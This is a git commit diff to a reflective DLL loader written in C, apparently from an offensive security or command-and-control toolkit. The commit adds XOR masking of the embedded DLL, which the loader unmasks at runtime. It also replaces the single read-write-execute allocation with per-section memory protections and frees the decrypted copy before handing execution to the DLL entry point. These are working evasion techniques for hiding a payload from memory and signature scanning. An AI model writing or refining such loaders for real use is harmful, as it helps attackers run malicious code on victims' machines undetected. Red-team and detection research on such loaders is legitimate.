45e8ded7d031c27df4dc67c2a799239d5ea6e753
Jakob Friedl <71284620+jakobfriedl@users.noreply.github.com>
2026-08-06 18:14:12 +0200

    Added simple XOR resource masking to default loader.

--- data/tools/tcg/loaders/default/src/loader.c
+++ data/tools/tcg/loaders/default/src/loader.c
@@ -30,6 +30,8 @@
 #include "tcg.h"
 
 WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+WINBASEAPI BOOL   WINAPI KERNEL32$VirtualFree (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
+WINBASEAPI BOOL   WINAPI KERNEL32$VirtualProtect (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
 
 /*
  * This is our opt-in Dynamic Function Resolution resolver. It turns MODULE$Function into pointers.
@@ -50,40 +52,87 @@ __declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)WIN_GET_CALLER
 /*
  * This is the Crystal Palace convention for getting ahold of data linked with this loader.
  */
-char __DLLDATA__[0] __attribute__((section("my_data")));
+char _DLL_   [0] __attribute__ ( ( section ( "dll"   ) ) );  
+char _MASK_  [0] __attribute__ ( ( section ( "mask"  ) ) ); 
 
-char * findAppendedDLL() {
-	return (char *)&__DLLDATA__;
+#define GETRESOURCE(x) ( char * ) &x
+
+typedef struct {
+    int  len;
+    char value[];
+} RESOURCE;
+
+
+void fix_section_permissions(DLLDATA * dll, char * dst) {
+	DWORD section_count = dll->NtHeaders->FileHeader.NumberOfSections;
+	IMAGE_SECTION_HEADER * section_hdr = (IMAGE_SECTION_HEADER *) PTR_OFFSET(dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);
+
+	for (int i = 0; i < section_count; i++) {
+		void  * section_dst  = dst + section_hdr->VirtualAddress;
+		DWORD   section_size = section_hdr->SizeOfRawData;
+		DWORD   new_protect  = 0;
+		DWORD   old_protect  = 0;
+
+		if (section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE)
+			new_protect = PAGE_WRITECOPY;
+		if (section_hdr->Characteristics & IMAGE_SCN_MEM_READ)
+			new_protect = PAGE_READONLY;
+		if ((section_hdr->Characteristics & IMAGE_SCN_MEM_READ) && (section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE))
+			new_protect = PAGE_READWRITE;
+		if (section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE)
+			new_protect = PAGE_EXECUTE;
+		if ((section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE))
+			new_protect = PAGE_EXECUTE_WRITECOPY;
+		if ((section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (section_hdr->Characteristics & IMAGE_SCN_MEM_READ))
+			new_protect = PAGE_EXECUTE_READ;
+		if ((section_hdr->Characteristics & IMAGE_SCN_MEM_READ) && (section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE) && (section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE))
+			new_protect = PAGE_EXECUTE_READWRITE;
+
+		KERNEL32$VirtualProtect(section_dst, section_size, new_protect, &old_protect);
+		section_hdr++;
+	}
 }
 
 /*
  * Our reflective loader itself, have fun, go nuts!
  */
 void go() {
-	char       * dst;
-	char       * src;
 	DLLDATA      data;
 	IMPORTFUNCS  funcs;
 
-	/* find our DLL appended to this PIC */
-	src = findAppendedDLL();
+	RESOURCE* masked_dll = (RESOURCE*) GETRESOURCE ( _DLL_ );
+	RESOURCE* mask_key   = (RESOURCE*) GETRESOURCE ( _MASK_ );
 
-	/* parse our DLL! */
-	ParseDLL(src, &data);
+	char* dll_src = KERNEL32$VirtualAlloc ( NULL, masked_dll->len, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );
 
-	/* allocate memory for it! */
-	dst = KERNEL32$VirtualAlloc( NULL, SizeOfDLL(&data), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+	for ( int i = 0; i < masked_dll->len; i++ ) {
+		dll_src [ i ] = masked_dll->value [ i ] ^ mask_key->value [ i % mask_key->len ];
+	}
 
-	/* load the damned thing */
-	LoadDLL(&data, src, dst);
+	/* parse our DLL */
+	ParseDLL(dll_src, &data);
+
+	/* allocate memory */
+	char* dll_dst = KERNEL32$VirtualAlloc ( NULL, SizeOfDLL ( &data ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );
+
+	/* load the DLL */
+	LoadDLL(&data, dll_src, dll_dst);
 
 	/* setup our IMPORTFUNCS data structure */
 	funcs.GetProcAddress = GetProcAddress;
 	funcs.LoadLibraryA   = LoadLibraryA;
 
 	/* process the imports */
-	ProcessImports(&funcs, &data, dst);
+	ProcessImports(&funcs, &data, dll_dst);
+
+	/* fix section permissions */
+	fix_section_permissions(&data, dll_dst);
+
+	DLLMAIN_FUNC entry_point = EntryPoint(&data, dll_dst);
+
+	/* free the decrypted DLL copy */
+	KERNEL32$VirtualFree(dll_src, 0, MEM_RELEASE);
 
 	/* pass execution to our DLL */
-	EntryPoint(&data, dst)((HINSTANCE)dst, DLL_PROCESS_ATTACH, NULL);
+	entry_point((HINSTANCE)dll_dst, DLL_PROCESS_ATTACH, NULL);
 }
